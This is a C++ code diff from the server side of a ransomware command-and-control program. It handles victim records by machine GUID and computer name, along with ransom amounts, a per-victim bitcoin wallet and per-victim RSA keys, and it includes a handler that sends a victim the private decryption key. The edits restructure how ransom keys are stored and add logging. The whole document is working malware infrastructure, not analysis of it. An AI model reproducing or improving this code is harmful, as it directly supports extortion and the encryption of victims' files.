@@ -131,11 +131,10 @@ BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
  * 
  * \return File contents as a JSON type
  */
-JSON ServerInterface::ReadServerStateFile() {
+JSON ServerInterface::ReadServerStateFile() noexcept {
 	JSON parsed;
-	if ( std::filesystem::file_size(ReadConfig().serverStateFullPath) == 0 ) {
+	if ( std::filesystem::file_size(ReadConfig().serverStateFullPath) == 0 ) // empty file
 		return parsed;
-	}
 	
 	std::ifstream input(ReadConfig().serverStateFullPath);
 
@@ -162,18 +161,19 @@ Client* ServerInterface::GetClientSaveFile(long cuid) {
 	if ( !data.contains("client_list") )
 		return nullptr;
 
-	JSON JSONClientList = data["client_list"];
-	JSON JSONClientInfo = JSONClientList[machineGUID];
+	JSON JSONClientInfo = data["client_list"][machineGUID];
 	client->SetDesktopName(JSONClientInfo["computer_name"]);
 	client->RansomAmountUSD = JSONClientInfo["ransom_payment_usd"];
 	client->SetMachineGUID(JSONClientInfo["machine_guid"]); 
 
 	RSAKeys secrets;
-	macaron::Base64::Decode(JSONClientInfo["b64_rsa_public_key"], secrets.strPublicKey);
-	macaron::Base64::Decode(JSONClientInfo["b64_rsa_private_key"], secrets.strPrivateKey);
-	secrets.strPrivateKey = client->GetSecrets().strPrivateKey;
-	secrets.strPrivateKey = client->GetSecrets().strPublicKey;
-	client->SetEncryptionKeys(secrets);
+	macaron::Base64::Decode(JSONClientInfo["ransom_keys_b64"]["rsa_public_key"], secrets.strPublicKey);
+	macaron::Base64::Decode(JSONClientInfo["ransom_keys_b64"]["rsa_private_key"], secrets.strPrivateKey);
+
+	secrets.bioPrivateKey = Serialization::GetBIOFromString(secrets.strPrivateKey);
+	secrets.bioPublicKey  = Serialization::GetBIOFromString(secrets.strPublicKey);
+
+	client->SetRansomSecrets(secrets);
 	client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];
 
 	return client;
@@ -206,8 +206,10 @@ BOOL ServerInterface::SaveServerState() {
 			{ "client_id", client.ClientUID },
 			{ "unique_btc_wallet", client.UniqueBTCWalletAddress },
 			{ "ransom_payment_usd", client.RansomAmountUSD },
-			{ "b64_rsa_public_key", macaron::Base64::Encode(client.GetSecrets().strPublicKey) },
-			{ "b64_rsa_private_key", macaron::Base64::Encode(client.GetSecrets().strPrivateKey) },
+		};
+		data["client_list"][client.GetMachineGUID()]["ransom_keys_b64"] = {
+			{ "rsa_public_key", macaron::Base64::Encode(client.GetRansomSecrets().strPublicKey) },
+			{ "rsa_private_key", macaron::Base64::Encode(client.GetRansomSecrets().strPrivateKey) },
 		};
 	}
 
@@ -324,16 +326,24 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 	case ClientMessage::kRequestPrivateEncryptionKey: 
 	{
 		// tcp only command
-		if ( !onTCP ) 
+		if ( !onTCP ) {
+			std::cout << "not on tcp\n";
 			break;
+		}
 
 		//if ( !IsRansomPaid(client) ) {
 		//	success = FALSE;
 		//	break;
 		//}
 
-		ServerCommand reply(RemoteAction::kReturnPrivateRSAKey, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
-		success = TCPSendMessageToClient(cuid, reply);
+		ServerCommand reply = {};
+		reply.action = RemoteAction::kReturnPrivateRSAKey;
+		reply.privateEncryptionKey = TCPClient->GetRansomSecrets().strPrivateKey;
+		reply.valid = TRUE;
+
+		std::cout << "received request for private ransom encryption key\n";
+		success = NetCommon::TransmitData(reply, TCPClient->GetSocket(TCP), TCP, NetCommon::_default, TRUE,	TCPClient->GetRequestSecrets().bioPublicKey, FALSE);
+		std::cout << "sent\n";
 
 		break;
 	}
@@ -389,12 +399,13 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
 			client->LastClientResponse = client->RecentClientResponse;
-			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(TCP), TRUE, Serialization::GetBIOFromString(client->GetRequestSecrets().strPrivateKey));
+			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(TCP), TRUE, client->GetRequestSecrets().bioPrivateKey);
 			continue;
 		}
 
 		// receive data from client, decrypt it using their rsa key
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, Serialization::GetBIOFromString(client->GetRequestSecrets().strPrivateKey));
+		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, client->GetRequestSecrets().bioPrivateKey);
+		std::cout << "received a message from a client on tcp\n";
 
 		BOOL performed = PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
 	} while ( client->Alive );
@@ -535,7 +546,7 @@ void ServerInterface::RunUserInputOnClients() {
 			4. Encrypt b64 with rsa
 		*/
 
-		std::cout << "Client " << client->ClientUID << " key: " << client->GetSecrets().strPrivateKey << std::endl;
+		std::cout << "Client " << client->ClientUID << " key: " << client->GetRequestSecrets().strPrivateKey << std::endl;
 		BYTESTRING serialized = Serialization::SerializeStruct<ServerCommand>(performingCommand);
 		std::string b64 = macaron::Base64::Encode(Serialization::BytestringToString(serialized));
 		BYTESTRING b64bs = Serialization::SerializeString(b64);
@@ -570,6 +581,7 @@ void ServerInterface::RunUserInputOnClients() {
 BOOL ServerInterface::GetClientMachineGUID(long cuid) {
 	Client* client = GetClientPtr(cuid);
 
+	std::cout << "receiving machine guid\n";
 	BYTESTRING machienGUID;
 	BOOL received = NetCommon::ReceiveData(machienGUID, client->GetSocket(TCP), TCP);
 	if ( !received )
@@ -578,6 +590,7 @@ BOOL ServerInterface::GetClientMachineGUID(long cuid) {
 	BYTESTRING decrypted = LGCrypto::RSADecrypt(machienGUID, client->GetRequestSecrets().bioPrivateKey, TRUE);
 	std::string machineGuid = Serialization::BytestringToString(decrypted);
 	client->SetMachineGUID(machineGuid);
+	std::cout << "received machine guid: " << client->GetMachineGUID() << std::endl;
 	return TRUE;
 }
 
@@ -595,7 +608,7 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
 	if ( !received )
 		return FALSE;
 
-	std::cout << "going to decrypt client machine guid with key " << client->GetSecrets().strPrivateKey << std::endl;
+	std::cout << "going to decrypt client machine guid with key " << client->GetRequestSecrets().strPrivateKey << std::endl;
 
 	BYTESTRING decrypted = LGCrypto::RSADecrypt(computerNameSerialized, client->GetRequestSecrets().bioPrivateKey, TRUE);
 	std::string computerName = Serialization::BytestringToString(decrypted);
